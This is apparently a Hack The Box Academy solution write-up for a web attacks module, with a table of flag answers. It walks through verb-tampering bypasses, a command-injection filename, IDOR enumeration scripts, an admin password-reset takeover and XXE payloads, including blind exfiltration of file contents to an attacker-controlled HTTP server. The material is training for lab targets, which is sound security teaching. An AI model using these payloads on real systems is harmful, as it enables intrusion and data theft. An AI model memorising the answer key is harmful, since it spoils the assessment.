| Section | Question Number | Answer |
| --- | --- | --- |
| Bypassing Basic Authentication | Question 1 | HTB{4lw4y5\_c0v3r\_4ll\_v3rb5} |
| Bypassing Security Filters | Question 1 | HTB{b3\_v3rb\_c0n51573n7} |
| Mass IDOR Enumeration | Question 1 | HTB{4ll\_f1l35\_4r3\_m1n3} |
| Bypassing Encoded References | Question 1 | HTB{h45h1n6\_1d5\_w0n7\_570p\_m3} |
| IDOR in Insecure APIs | Question 1 | eb4fe264c10eb7a528b047aa983a4829 |
| Chaining IDOR Vulnerabilities | Question 1 | HTB{1\_4m\_4n\_1d0r\_m4573r} |
| Local File Disclosure | Question 1 | UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg |
| Advanced File Disclosure | Question 1 | HTB{3rr0r5\_c4n\_l34k\_d474} |
| Blind Data Exfiltration | Question 1 | HTB{1\_d0n7\_n33d\_0u7pu7\_70\_3xf1l7r473\_d474} |
| Web Attacks - Skills Assessment | Question 1 | HTB{m4573r\_w3b\_4774ck3r} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Bypassing Basic Authentication

## Question 1

### "Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag."

After spawning the target machine, students need to use `Burp Suite` to intercept the request sent from clicking on the "Reset" button found on the machine's website root page:

![[HTB Solutions/CPTS/z. images/c21fc2807491b5e7ddc67c26f09a1502_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/65430c832e1661efbdae322598b78292_MD5.jpg]]

If students forward the request as is, they will be prompted with a basic authentication prompt:

![[HTB Solutions/CPTS/z. images/629b8d86ce1614b3b12e9ae7077136cf_MD5.jpg]]

Thus, students need to change the request method to `OPTIONS` or `PATH` to bypass the authentication prompt; `OPTIONS` will be used:

![[HTB Solutions/CPTS/z. images/a7be9c9198ef6ec08ebbce78e59b07a1_MD5.jpg]]

Afterward, students need to forward the edited request:

![[HTB Solutions/CPTS/z. images/e0e8d82a418a66473764ae5cbddeb224_MD5.jpg]]

When checking the webpage (students might need to refresh it), students will attain the flag `HTB{4lw4y5_c0v3r_4ll_v3rb5}`:

![[HTB Solutions/CPTS/z. images/878d0eb9d824dfa99ceea7c27a75ce97_MD5.jpg]]

Answer: `HTB{4lw4y5_c0v3r_4ll_v3rb5}`

# Bypassing Security Filters

## Question 1

### "To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./"

After spawning the target machine, students need to use `Burp Suite` to intercept the request sent from clicking on the "Enter" key, after providing `file; cp /flag.txt ./` as the file name:

![[HTB Solutions/CPTS/z. images/72c5d177387571b7f9810bff60a0c8b6_MD5.jpg]]

Students then need to right-click and choose "Change request method":

![[HTB Solutions/CPTS/z. images/8dbf403f94f91baf23d24e4b7dc30ace_MD5.jpg]]

Subsequently students then need forward the edited request:

![[HTB Solutions/CPTS/z. images/94888929253fe73f9aa2e3725f64f6da_MD5.jpg]]

Going back to the website's root page (it's important that "Interception" is turned off, unless students will forward the subsequent requests manually), students will find the file "flag.txt":

![[HTB Solutions/CPTS/z. images/9d8fe59e0e0cfae94cde42b3f1c59369_MD5.jpg]]

When checking its contents, students will attain the flag `HTB{b3_v3rb_c0n51573n7}`:

![[HTB Solutions/CPTS/z. images/1f4ef40786b1ff97369e8ddd58278147_MD5.jpg]]

Answer: `HTB{b3_v3rb_c0n51573n7}`

# Mass IDOR Enumeration

## Question 1

### "Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a 'flag.txt' document."

After spawning the target machine and visiting its website's root webpage, students first need to intercept the request that retrieves documents:

![[HTB Solutions/CPTS/z. images/ff87a11b1b17440c31c58bc3936cbdb9_MD5.jpg]]

Students will notice that a POST request gets sent to `/documents.php`, along with the `uid` of the employee passed in the `uid` POST parameter; the web server returns the documents of the relevant employee by appending the file names in the `href` attribute within `anchor` tags:

![[HTB Solutions/CPTS/z. images/f40e6501eaa64384b49e6d5e19d44de1_MD5.jpg]]

Therefore, students need to write a script to loop over the first 20 employees' `uid` and capture their document names/links to subsequently download them:

Code: bash

```bash
#!/bin/bash

url="http://$1"

for i in {1..20}; do
	for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "/documents.*?\.[a-z]{3}"); 
	do
		wget -q $url$link
	done
done
```

After saving the script into a file, students need to run it and provide `STMIP:STMPO` as the first command line argument:

Code: shell

```shell
bash script.sh STMIP:STMPO
```

```
┌─[us-academy-1]─[10.10.14.20]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ bash script.sh 94.237.62.195:53190
```

Once the script finishes executing, students will find the flag `HTB{4ll_f1l35_4r3_m1n3}` in the file `flag_11dfa168ac8eb2958e38425728623c98.txt`:

Code: shell

```shell
cat flag_11dfa168ac8eb2958e38425728623c98.txt
```

```
┌─[us-academy-1]─[10.10.14.20]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat flag_11dfa168ac8eb2958e38425728623c98.txt

HTB{4ll_f1l35_4r3_m1n3}
```

Answer: `HTB{4ll_f1l35_4r3_m1n3}`

# Bypassing Encoded References

## Question 1

### "Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly."

After spawning the target machine and viewing the page source of the `/contracts.php` page, students will notice that the `/download.php` page takes the `contract` parameter with the value being the base64 of `uid`:

![[HTB Solutions/CPTS/z. images/f4b98e812797a9315354559c9fca1b40_MD5.jpg]]

Thus, students need to write a script that will loop over the different employees' `uid` from 1 to 20 and base64 encode them so that they get passed as values for the `contract` parameter and download the corresponding files:

Code: bash

```bash
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0); do
        curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
    done
done
```

After running the script, students will have 20 PDF files downloaded, and to know which one of them contains the flag, students can use `ls` with the `-l` flag to notice that all of them are empty except `contract_98f13708210194c475687be6106a3b84.pdf`:

Code: shell

```shell
ls -lAS contract_*
```

```
┌─[us-academy-1]─[10.10.14.9]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ls -lAS contract_*

-rw-r--r-- 1 htb-ac413848 htb-ac413848 30 Jul 25 18:04 contract_98f13708210194c475687be6106a3b84.pdf
-rw-r--r-- 1 htb-ac413848 htb-ac413848  0 Jul 25 18:04 contract_1679091c5a880faf6fb5e6087eb1b2dc.pdf
-rw-r--r-- 1 htb-ac413848 htb-ac413848  0 Jul 25 18:04 contract_1f0e3dad99908345f7439f8ffabdffc4.pdf
-rw-r--r-- 1 htb-ac413848 htb-ac413848  0 Jul 25 18:04 contract_45c48cce2e2d7fbdea1afc51c7c6ad26.pdf
-rw-r--r-- 1 htb-ac413848 htb-ac413848  0 Jul 25 18:04 contract_6512bd43d9caa6e02c990b0a82652dca.pdf

<SNIP>
```

Thus, students need to use `cat` on the PDF file to attain the flag `HTB{h45h1n6_1d5_w0n7_570p_m3}` :

Code: shell

```shell
cat contract_98f13708210194c475687be6106a3b84.pdf
```

```
┌─[us-academy-1]─[10.10.14.9]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat contract_98f13708210194c475687be6106a3b84.pdf

HTB{h45h1n6_1d5_w0n7_570p_m3}
```

Answer: `HTB{h45h1n6_1d5_w0n7_570p_m3}`

# IDOR in Insecure APIs

## Question 1

### "Try to read the details of the user with 'uid=5'. What is their 'uuid' value?"

After spawning the target machine and navigating to its web root page, students need to click on the "Edit Profile" button, forward the first `POST` request, and then send the second `GET` intercepted request to "Repeater" using `Burp Suite`:

![[HTB Solutions/CPTS/z. images/03581aff578ef3c4ec0c7c64c1af6ee2_MD5.jpg]]

Students will notice that the intercepted request is making a `GET` request to `/profile/api.php/profile/1`; therefore, students need to change "1" to "5" and send the modified request to attain the `uuid` of the user with the `uid` of 5, finding it to be `eb4fe264c10eb7a528b047aa983a4829`:

![[HTB Solutions/CPTS/z. images/3d1385e6662a303109bb56d3d5395c9e_MD5.jpg]]

Answer: `eb4fe264c10eb7a528b047aa983a4829`

# Chaining IDOR Vulnerabilities

## Question 1

### "Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page."

After spawning the target machine, students first need to attain the `uuid` of an admin account. To do so, students need to enumerate over the `uid` of the employees using the `/profile/api.php/profile/` endpoint using a bash script:

Code: bash

```bash
#!/bin/bash

for uid in {1..10}; do
	curl -s "http://STMIP:STMPO/profile/api.php/profile/$uid"; echo
done
```

Students can use `grep` to filter for word "admin" after piping the results of the script:

Code: shell

```shell
bash script.sh | grep "admin" | jq .
```

```
┌─[us-academy-1]─[10.10.14.9]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ bash script.sh | grep "admin" | jq .

{
  "uid": "10",
  "uuid": "bfd92386a1b48076792e68b596846499",
  "role": "staff_admin",
  "full_name": "admin",
  "email": "admin@employees.htb",
  "about": "Never gonna give you up, Never gonna let you down"
}
```

Now that the students have attained the `uid` and `uuid` of an admin account, they need to go to the web root page of the spawned target machine, click on the "Edit Profile" button, then click on the "Update profile" button within the "Edit Profile" page while having Burp Suite intercepting requests:

![[HTB Solutions/CPTS/z. images/7911e51e8f9d3829801625025ded7e57_MD5.jpg]]

Subsequently, students need to edit the sent information about the user making it match that of the "admin" account attained earlier, however, the email is changed to `flag@idor.htb` instead and "1" in the endpoint is changed to 10 and at last send the modified intercepted request:

Code: json

```json
{
  "uid": "10",
  "uuid": "bfd92386a1b48076792e68b596846499",
  "role": "staff_admin",
  "full_name": "admin",
  "email": "flag@idor.htb",
  "about": "Never gonna give you up, Never gonna let you down"
}
```

![[HTB Solutions/CPTS/z. images/8450de4507d19ac39c913a522c9c05f6_MD5.jpg]]

Afterward, students need to refresh the "Edit Profile" page to find the flag `HTB{1_4m_4n_1d0r_m4573r}` at the bottom of the page:

![[HTB Solutions/CPTS/z. images/13913d98aae24e9692fca26a929e5f7f_MD5.jpg]]

Answer: `HTB{1_4m_4n_1d0r_m4573r}`

# Local File Disclosure

## Question 1

### "Try to read the content of the 'connection.php' file, and submit the value of the 'api\_key' as the answer."

After spawning the target machine, students need to run `Burp Suite`, make sure that `FoxyProxy` is set to the preconfigured option "Burp (8080)" in Firefox, and then intercept the form request that contains dummy data:

![[HTB Solutions/CPTS/z. images/15742777da16522b1c87bed0ff223f03_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/0923dd5e21c2d97e7369d3c9029a4041_MD5.jpg]]

Students then need to use the base64 PHP filter, by adding the below XML data under `<?xml version="1.0" encoding="UTF-8"?>`:

Code: xml

```xml
<!DOCTYPE
email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```

Because the email is being displayed back, students need to place the "company" entity reference in it as such:

Code: xml

```xml
<email>
	&company;
</email>
```

![[HTB Solutions/CPTS/z. images/4ced59d52b92d261674ce1b9bb2c17f8_MD5.jpg]]

Students can send the modified intercepted request to "Repeater" (Ctrl + R) then send the request, and they will receive the base64 encoded PHP file in the response:

![[HTB Solutions/CPTS/z. images/7addcd243634441771c63a818c2ce056_MD5.jpg]]

Within the response panel, students need to double click on the base64 string and "Inspector" will decode it; students will find the value of "api\_key" to be `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`:

![[HTB Solutions/CPTS/z. images/7e7a049868ce538952ac1f7c03aa2bd3_MD5.jpg]]

Answer: `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`

# Advanced File Disclosure

## Question 1

### "Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error')."

The `CDATA` method will be used first.

After spawning the target machine, students first need to create a `DTD` file on Pwnbox/`PMVPN` utilizing the XML Parameter Entities:

Code: shell

```shell
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
```

```
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd
```

Afterward, students need to start an HTTP server, such as with Python:

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students need to navigate to `/index.php` and provide dummy data to the required fields. Thereafter, students need to run Burp Suite, make sure that FoxyProxy is set to the preconfigured option "Burp (8080)" in Firefox, and intercept the form request to `/index.php`:

![[HTB Solutions/CPTS/z. images/b15d0fee59e120d4ade4ed497726c7fc_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/3cb890bc401bbea9094d413a2775f7b7_MD5.jpg]]

Students then need to append the following XML data after `<?xml version="1.0" encoding="UTF-8"?>` and place `&joined;` in the email element:

Code: xml

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://PWNIP:8000/XXE.dtd">
  %xxe;
]>
```

![[HTB Solutions/CPTS/z. images/a3f7b735860a89fef75358fa6957ca65_MD5.jpg]]

Before forwarding the modified intercepted request, students need to intercept the response:

![[HTB Solutions/CPTS/z. images/07c62812c0fc1d6b1f15bf4c1ca68588_MD5.jpg]]

After forwarding the request and intercepting the response, students will find the flag `HTB{3rr0r5_c4n_l34k_d474}` within it:

![[HTB Solutions/CPTS/z. images/e0ff94c2ecc158e5686b90cbbd7c68a6_MD5.jpg]]

To use the error-based method, students first need to write the following error-causing entity lines to a DTD file on Pwnbox/`PMVPN`:

Code: xml

```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
EOF
```

Subsequently, students need to navigate to `/error/` and fill dummy data in the form as with the `CDATA` method then intercept the request using `Burp Suite`:

![[HTB Solutions/CPTS/z. images/adbc37ae0bff7264fd48484114731e75_MD5.jpg]]

Students then need to append the following XML data after `<?xml version="1.0" encoding="UTF-8"?>`:

Code: xml

```xml
<!DOCTYPE email [
<!ENTITY % remote SYSTEM "http://PWNIP:PWNPO/XXE.dtd">  
%remote;
%error;
]>
```

After instructing `Burp Suite` to intercept the response to this request and forwarding it, students will attain the flag `HTB{3rr0r5_c4n_l34k_d474}` within it (students also need to make sure that their HTTP server from the CDATA method is still running):

![[HTB Solutions/CPTS/z. images/f96f7d801f634a50d84df2fb443ee2ae_MD5.jpg]]

Answer: `HTB{3rr0r5_c4n_l34k_d474}`

# Blind Data Exfiltration

## Question 1

### "Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag."

After spawning the target machine, students first need to create the OOB DTD file on Pwnbox/`PMVPN`:

Code: shell

```shell
cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://PWNIP:PWNPO/?content=%file;'>">
EOF
```

```
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.134:8000/?content=%file;'>">
EOF
```

Afterward, students need to start an HTTP server:

Code: shell

```shell
python3 -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Afterward, students need to run `Burp Suite`, make sure that FoxyProxy is set to the preconfigured option "Burp (8080)" in Firefox, and intercept the request to `/blind/submitDetails.php` to change its request method from `GET` to `POST`:

![[HTB Solutions/CPTS/z. images/da7cd1f64780f66cbc19fbd95891a791_MD5.jpg]]

Subsequently, students need to send the below XML data by appending it at the end of the request:

Code: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://PWNIP:8000/XXE.dtd">
	  %remote;
	  %oob;
	]>
	<root>
		&content;
	</root>
```

![[HTB Solutions/CPTS/z. images/71957beac4e87ba922dd987ff2cfb074_MD5.jpg]]

After forwarding the request, students will notice that their HTTP server has gotten a request for the "XXE.dtd" file, along with the base64 encoded string of the PHP file:

```
10.129.138.36 - - [21/Jul/2022 18:57:49] "GET /XXE.dtd HTTP/1.0" 200 -
10.129.138.36 - - [21/Jul/2022 18:57:49] "GET /?content=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K HTTP/1.0" 200 -
```

Decoding the base64 string yields out the flag `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`:

Code: shell

```shell
echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d
```

```
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d

<?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
```

Answer: `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`

# Web Attacks - Skills Assessment

## Question 1

### "Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'."

After spawning the target machine, students need to visit its website's root page and login with the credentials `htb-student:Academy_student!`, making sure to have the Network tab of the Web Developer Tools (`FN` + `F12`) open:

![[HTB Solutions/CPTS/z. images/6fd5d16ae09f35b26a1765305157c7a1_MD5.jpg]]

Inspecting the sent requests, students will notice that there is a GET request to the endpoint `/api.php/user/74` which retrieves the data to populates the user's info:

![[HTB Solutions/CPTS/z. images/e253cd79c8c87e9ad2274ef7fdfbe6cf_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/938dabd456c99047e2f556d5ff5f8d02_MD5.jpg]]

Students need to test if this endpoint is vulnerable to IDOR, by changing the `uid` value to be, for example, 75:

![[HTB Solutions/CPTS/z. images/1a5561f8d2c1a721f1619170398b16b2_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/29a13f789338e7a5100daabeaf115b44_MD5.jpg]]

Checking the Response tab of the response received from the sent modified request, students will notice that the endpoint is indeed vulnerable to IDOR, as the data of the user with the `uid` 75 is returned back:

![[HTB Solutions/CPTS/z. images/cf1ef2c89ee8764ad4cb35e00fe81476_MD5.jpg]]

Subsequently, students need to fuzz the `uid` of users from 1 to 100:

Code: bash

```bash
#!/bin/bash

for uid in {1..100}; do
	curl -s "http://STMIP:STMPO/api.php/user/$uid"; echo
done
```

Since students are hunting for privileged users, they need to run the script and use `grep` to search for strings that contain `admin`, finding the user with `uid` 52:

Code: shell

```shell
bash fuzz | grep -i "admin" | jq .
```

```
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-1s2haz25lu]─[~]
└──╼ [★]$ bash fuzz | grep -i "admin" | jq .
{
  "uid": "52",
  "username": "a.corrales",
  "full_name": "Amor Corrales",
  "company": "Administrator"
}
```

However, the password of the user is still unknown. Analyzing the web application more deeply, students will notice that they can change the password of the current user via the `Settings` page (students need to have the Network tab open still):

![[HTB Solutions/CPTS/z. images/35648bbc363011f1c28025692f571620_MD5.jpg]]

When attempting to change the password, students will notice that the web application sends a GET request to the endpoint `/api/token/74`, and within the response of the request, the `token` of the user is returned, which is `e51a8a14-17ac-11ec-8e67-a3c050fe0c26` for the user with the `uid` of 74:

![[HTB Solutions/CPTS/z. images/d9bec5f1b39900f55e2ab90407ccd7c9_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/c7283ccc884d83abac2779ab2d114bd4_MD5.jpg]]

Instead of attaining the token for `uid` 74, students need to modify it to 52, as in `/api.php/token/52`:

![[HTB Solutions/CPTS/z. images/46e348067e4a9aa74bd69107d93465d9_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/e636418218acb3eba9c9aadeaa59c57b_MD5.jpg]]

When checking the response of the sent modified request, students will get `e51a85fa-17ac-11ec-8e51-e78234eb7b0c` as the `token` for the user with `uid` 52:

![[HTB Solutions/CPTS/z. images/7634fcc362a350716f947bdd437322da_MD5.jpg]]

Checking the POST request to `reset.php`, students will notice that it requires three parameters, `uid`, `token`, and `password`:

![[HTB Solutions/CPTS/z. images/beb547e17dfd1b6ba1bc7f54527ea119_MD5.jpg]]

Instead of reseting the password of the user with `uid` 74, students need to reset the one for `uid` 52, given that all three parameters are known (`uid:52`, `token:e51a85fa-17ac-11ec-8e51-e78234eb7b0c`, and `password` can be set to any arbitrary value, however, it is always a good practice to set it to a strong password to avoid other intruders from accessing the account; students can generate one with the command `openssl rand -hex 16`):

![[HTB Solutions/CPTS/z. images/8480b4376789876d67ccdba3534153cf_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/86e25ebfcf43166dd61d7f90ea92d71e_MD5.jpg]]

However, when checking the response to the request, students will notice that it says in the response "Access Denied", as the backend is most probably checking `PHPSESSID` against the `uid` being sent in the request:

![[HTB Solutions/CPTS/z. images/79c79cb431f23ba8a958597c880c8d32_MD5.jpg]]

Students need to bypass this security mechanism by attempting verb tampering, therefore sending a GET request instead of POST, sending the parameters as URL parameters, as in `http://STMIP:STMPO/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25`:

![[HTB Solutions/CPTS/z. images/863be21a3ff68d02d0611c318d2e6a5d_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/bfcb48a39151d2cdb93371fb1fa26dcf_MD5.jpg]]

After successfully changing the password, students need to sign in as the user `a.corrales` with the password that was used previously (`f0e18de14fdadfc38350d97ff7284a25` in here):

![[HTB Solutions/CPTS/z. images/245b2e1e7ed43fe907a68ee2a4683dca_MD5.jpg]]

After successfully signing in as `a.corrales`, students will notice that there is a new feature of "adding events", thus, they need to click on "ADD EVENT":

![[HTB Solutions/CPTS/z. images/a0a831396c2375d591d5e9d545ccf887_MD5.jpg]]

With the Network tab of the Web Developer Tools open, students need to feed the fields any dummy data and inspect the POST request sent to `addEvent.php`, discovering that the request payload is `XML` data:

![[HTB Solutions/CPTS/z. images/9981e27bcefa9dcbec2d96a49c6dae38_MD5.jpg]]

Students need to instead send a malicious XXE payload that will read the flag file "/flag.php" via the the PHP filter `convert.base64-encode`:

Code: xml

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```

![[HTB Solutions/CPTS/z. images/1be676a16d82c335401ee317897f1c67_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/f03697b0392349d41e95db0c0136e60a_MD5.jpg]]

After sending the request and checking its response, students will attain the base64-encoded string `PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K`:

![[HTB Solutions/CPTS/z. images/804983bd463ac64d8787599ca60c6249_MD5.jpg]]

At last, students need to decode it to find the flag `HTB{m4573r_w3b_4774ck3r}`:

Code: shell

```shell
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
```

```
┌──(kali㉿kali)-[~]
└─$ echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d

<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

Answer: `HTB{m4573r_w3b_4774ck3r}`